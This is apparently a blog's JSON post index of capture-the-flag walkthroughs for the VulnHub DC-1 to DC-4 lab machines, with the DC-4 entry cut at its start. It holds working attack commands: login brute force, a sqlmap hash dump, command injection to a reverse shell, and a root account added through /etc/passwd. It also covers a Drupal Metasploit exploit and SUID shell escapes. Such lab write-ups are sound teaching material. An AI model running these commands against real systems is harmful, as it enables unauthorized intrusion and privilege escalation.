inforamtion Systems login GobusterAfter running gobuster we see that we have a command.php but it redirect to login.php. I tried sql injection and other attacks but no luck. The final option is Bruteforce.$gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.1.8 -x php,html,txt -o go-main.out/index.php (Status: 200)/images (Status: 301)/login.php (Status: 302)/css (Status: 301)/logout.php (Status: 302)/command.php (Status: 302)Bruteforce using burpsuiteAs per the site mainpage, I set username filed as admin and using burpsuite brute force the login page.We get credentials.username : adminpassword : happyCommand injectionAfter login we have command option by clicking this we can see list of commands.Pick one of them and see the result.So, I intercept the request in burp and send it to repeter.Change the radio option to reverse shell, set up netcat listener and get the shell.First UserThere are 3 user on box charles, jim and sam. We found old-password.txt in home directory of user jim.Now brute force the SSH and we get password for jim.Use this password to login to ssh.username : jimpassword : jibril04Second UserThe jim directory has mbox which is an test email. So, I checked /var/mail folder there is mail for jim.jim@dc-4:~$ lsbackups  mbox  test.shjim@dc-4:~$ cd /var/mailjim@dc-4:/var/mail$ lsjimMail has password for charles.jim@dc-4:/var/mail$ cat jimFrom charles@dc-4 Sat Apr 06 21:15:46 2019Return-path: &lt;charles@dc-4&gt;Envelope-to: jim@dc-4Delivery-date: Sat, 06 Apr 2019 21:15:46 +1000Received: from charles by dc-4 with local (Exim 4.89)\t(envelope-from &lt;charles@dc-4&gt;)\tid 1hCjIX-0000kO-Qt\tfor jim@dc-4; Sat, 06 Apr 2019 21:15:45 +1000To: jim@dc-4Subject: HolidaysMIME-Version: 1.0Content-Type: text/plain; charset=\"UTF-8\"Content-Transfer-Encoding: 8bitMessage-Id: &lt;E1hCjIX-0000kO-Qt@dc-4&gt;From: Charles &lt;charles@dc-4&gt;Date: Sat, 06 Apr 2019 21:15:45 +1000Status: OHi Jim,I'm heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.Password is:  ^xHhA&amp;hvim0ySee ya,CharlesUse this password to login to charles.jim@dc-4:~$ su - charlesPassword: charles@dc-4:~$ username : charlesPassword : ^xHhA&amp;hvim0yPrivesc to rootNow I checked the sudoers list and found that I can run teehee command without password.charles@dc-4:~$ sudo -lMatching Defaults entries for charles on dc-4:    env_reset, mail_badpass,    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser charles may run the following commands on dc-4:    (root) NOPASSWD: /usr/bin/teeheeWe can also see the help menu.charles@dc-4:~$ teehee --helpUsage: teehee [OPTION]... [FILE]...Copy standard input to each FILE, and also to standard output.  -a, --append              append to the given FILEs, do not overwrite  -i, --ignore-interrupts   ignore interrupt signals  -p                        diagnose errors writing to non pipes      --output-error[=MODE]   set behavior on write error.  See MODE below      --help     display this help and exit      --version  output version information and exitMODE determines behavior with write errors on the outputs:  'warn'         diagnose errors writing to any output  'warn-nopipe'  diagnose errors writing to any output not a pipe  'exit'         exit on error writing to any output  'exit-nopipe'  exit on error writing to any output not a pipeThe default MODE for the -p option is 'warn-nopipe'.The default operation when --output-error is not specified, is toexit immediately on error writing to a pipe, and diagnose errorswriting to non pipe outputs.GNU coreutils online help: &lt;http://www.gnu.org/software/coreutils/&gt;Full documentation at: &lt;http://www.gnu.org/software/coreutils/tee&gt;or available locally via: info '(coreutils) tee invocation'This binary append standered input to file. I added user in the /etc/passwd.charles@dc-4:~$ sudo teehee -a /etc/passwduser::0:0:::/bin/bash user::0:0:::/bin/bash^Ccharles@dc-4:~$ su userroot@dc-4:/home/charles# Root Flagroot@dc-4:/root# cat flag.txt 888       888          888 888      8888888b.                             888 888 888 888 888   o   888          888 888      888  \"Y88b                            888 888 888 888 888  d8b  888          888 888      888    888                            888 888 888 888 888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 888d88888b888 d8P  Y8b 888 888      888    888 d88\"\"88b 888 \"88b d8P  Y8b 888 888 888 888 88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P 8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      \"   \"   \"   \"  888P     Y888  \"Y8888  888 888      8888888P\"   \"Y88P\"  888  888  \"Y8888  888 888 888 888 Congratulations!!!Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all thosewho have provided feedback, and who have taken time to complete these littlechallenges.If you enjoyed this CTF, send me a tweet via @DCAU7."
  },
  
  {
    "title": "DC 3 Walkthrough",
    "url": "/posts/DC-3-Walkthrough/",
    "categories": "vulnhub, DC-Series",
    "tags": "dc-3, easy, joomla, CVE",
    "date": "2020-08-26 00:00:00 +0530",
    





    "snippet": "DC-3 was an easy machine. The website was hosted on Joomla. There was a sqli exploit that gives the admin password. By using an admin panel upload the shell. Priv esc using CVE.Summary  Portscan  Gobuster to findout directories  Search exploit  Use sqlmap to get admin password  Crack the password using John  Login to admin panel and inject reverse shell  Get reverse shell  Exploit Kernel using CVE  Getting Root  FlagReconPortscanNmap scan report for 192.168.1.7Host is up (0.00030s latency).Not shown: 999 closed portsPORT   STATE SERVICE VERSION80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))|_http-generator: Joomla! - Open Source Content Management|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: HomeJoomlaWhen I browse the website, I don’t find out anything interesting.So, I started the gobuster to find out directories.gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.1.7 -x php,txt,html/images (Status: 301)/media (Status: 301)/templates (Status: 301)/modules (Status: 301)/index.php (Status: 200)/plugins (Status: 301)/bin (Status: 301)/includes (Status: 301)/language (Status: 301)/README.txt (Status: 200)/components (Status: 301)/cache (Status: 301)/libraries (Status: 301)/tmp (Status: 301)/LICENSE.txt (Status: 200)/layouts (Status: 301)/administrator (Status: 301)/configuration.php (Status: 200)/htaccess.txt (Status: 200)/cli (Status: 301)/server-status (Status: 403)SqliThe README.txt file revels the webserver is running Joomla and its version is 3.7.I search the exploit on searchsploit and get the exploit for Joomla. The exploit php/webapps/42033.txt tells that version is vulnerable to sqli.So as per exploit I run sqlmap and get admin hash.sqlmap -u \"http://192.168.1.7/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml\" --risk=3 --level=5 --random-agent -D joomladb -T '#__users' -C name,password --dump   admin:$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1ZuI use John to crack the password.  admin:snoopyGetting reverse shell.Now I have username and password, I use those to log in to Joomla. By using admin panel I can edit the template files. So I paste the source code of php-reverse-shell in error.php of beez3 template andget a reverse shell.Getting RootI upload linpeas on server and run it. The exploit is available on searchsploit for ubuntu 16.04I download the exploit from net and transfer to server. By executing the exploit I get root access.unzip 39772.zipcd 39772tar xvf exploit.tarcd ebpf_mapfd_doubleput_exploit/./compile.sh./doubleputThe Flag"
  },
  
  {
    "title": "DC 2 Walkthrough",
    "url": "/posts/DC-2-Walkthrough/",
    "categories": "vulnhub, DC-Series",
    "tags": "dc-2, easy, wordpress, suid",
    "date": "2020-08-24 00:00:00 +0530",
    





    "snippet": "DC-2 is an easy machine. This machine starts with a WordPress site. After brute-forcing, We find out creds on the website that we use to get an ssh session on the box. Priv esc to root by exploiting git SUID binary.Summary  Portscan  Adding Domain to Host file  Finding users on wordpress  Creating wordlist  Bruteforce  Logging in Wordpress  SSH shell  Updating low shell to higher shell  Privilege Escalation  Getting ROOTPortscanNmap scan report for 192.168.1.10Host is up (0.00047s latency).PORT     STATE SERVICE VERSION80/tcp   open  http    Apache httpd 2.4.10 ((Debian))|_http-server-header: Apache/2.4.10 (Debian)|_http-title: Did not follow redirect to http://dc-2/|_https-redirect: ERROR: Script execution failed (use -d to debug)7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)| ssh-hostkey: |   1024 52:51:7b:6e:70:a4:33:7a:d2:4b:e1:0b:5a:0f:9e:d7 (DSA)|   2048 59:11:d8:af:38:51:8f:41:a7:44:b3:28:03:80:99:42 (RSA)|   256 df:18:1d:74:26:ce:c1:4f:6f:2f:c1:26:54:31:51:91 (ECDSA)|_  256 d9:38:5f:99:7c:0d:64:7e:1d:46:f6:e9:7c:c6:37:17 (ED25519)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelNmap scan show that port 80 and 7744 are openPort 80: On this port, I find out a Domain name. I added to /etc/hosts file and surf the page. I discovered that WordPress is installed.Port 7744: They are running SSH on this port. So I don't have any credentials so I moved forward.Initial Shell:Flag 1:I got the first flag on the Main pageAs per hint in the first flag, I created a password list using cewl.cewl -w password.txt http://dc-2After that, I use wpscan to identify possible users and I found 3 users.Users :-  admin  jerry  tomNow I have a password and user list so I brute force the wordpress.Here I use wfuzz to brute force.wfuzz -c --hc=200 -z file,users.txt -z file,password.txt -d 'log=FUZZ&amp;pwd=FUZ2Z&amp;wp-submit=Log+In' http://dc-2/wp-login.phpHere I got 2 passwords.  jerry:adipiscing  tom:parturientFlag 2:I use jerry password to access wordpress panel and got second flag.First User:I spend some time to upload php reverse shell, but no luck :(Then I tried same creds to access SSH on port 7744.$ ssh tom@dc-2 -p 7744Updating shell:I tried to cat the flag3.txt but no luck. We are in a restricted shell. I checked usr/bin directory and PATH variable I noticed that tom is using binaries from that directory.Here I learned new things about how to launch a shell using vi.Steps:  Open VI editor  Press ESC + :  set shell=/bin/bash  Again step 1 and 2  shellSo I have shell using VI.Now I am out of restricted shell but still using commands in usr/bin directory. I need to change PATH variable.export PATH=/bin:/usr/bin:$PATHFlag 3:Now I am able to cat the third flag.Second User:Flag gives hint we need to switch user i.e jerry.  jerry:adipiscingPrivesc to root:Now I checked the sudoers list and found that I can run git without password.After some googling I found a link.Final Flag"
  },
  
  {
    "title": "DC 1 Walkthrough",
    "url": "/posts/DC-1-Walkthrough/",
    "categories": "vulnhub, DC-Series",
    "tags": "dc-1, easy, Drupal, suid",
    "date": "2020-08-20 00:00:00 +0530",
    





    "snippet": "DC-1 was a simple and straightforward CVE based box. We find the server is hosting Drupal CMS. I saw that Drupal version had a CVE which allowed me drop a webshell in webserver. Priv esc to root by exploiting find SUID binary.Summary  Portscan  Drupal Enumeration  Exploting drupal to get shell  Privilege Escalation by exploting SUID binary  Getting Root  Final FlagPortscanNmap scan report for 192.168.1.12Host is up (0.00022s latency).Not shown: 997 closed portsPORT    STATE SERVICE22/tcp  open  ssh80/tcp  open  http111/tcp open  rpcbindDrupalI visit the website. I find that server is running Drupal CMS. I don’t have any idea about drupal so I search online and findout droopescan tool. I installed it and run it.For installation:pip install droopescanAfter installation I run droopescan.Initial ShellFrom scan I find out some useful stuff but drupal version grab my attention.Then I findout exploits on searchsploit.searchsploit drupal 7I start metasploit and used the exploit.use exploit/multi/http/drupal_drupageddonset rhosts 192.168.1.12runIn this way I have meterpreter sessionFlag 1After getting shell I found flag1.txt Netcat ShellNow I have meterpreter so tried to launch shell and run the commands but due to some reasons I am not able to run commands. The metasploit shell is not working so that I shift to netcat shell by uploading php-reverse-shell.Privesc to RootAfter some enumeration I noticed that find has SUID bit set, we can run the commands as root.With one simple command we get root./usr/bin/find . -exec /bin/sh \\; -quitFinal Flag"
  }
  
]

